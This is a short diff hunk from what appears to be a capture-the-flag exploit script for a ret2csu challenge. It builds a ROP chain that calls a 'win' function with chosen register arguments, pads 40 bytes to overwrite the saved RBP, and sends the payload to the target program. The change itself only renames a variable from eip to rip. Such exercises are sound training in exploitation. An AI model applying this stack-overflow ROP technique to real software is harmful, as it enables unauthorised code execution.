@@ -286,8 +286,8 @@ def ret2csu(call,rdi,rsi,rdx):
 
 payload = ret2csu(win, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) # call(rdi,rsi,rdx)
 
-eip = b'A'*40 # 32 bytes array size, 8 overwrite saved RBP
-rop = eip + payload
+rip = b'A'*40 # 32 bytes array size, 8 overwrite saved RBP
+rop = rip + payload
 
 p.recvuntil('> ')
 p.sendline(rop)
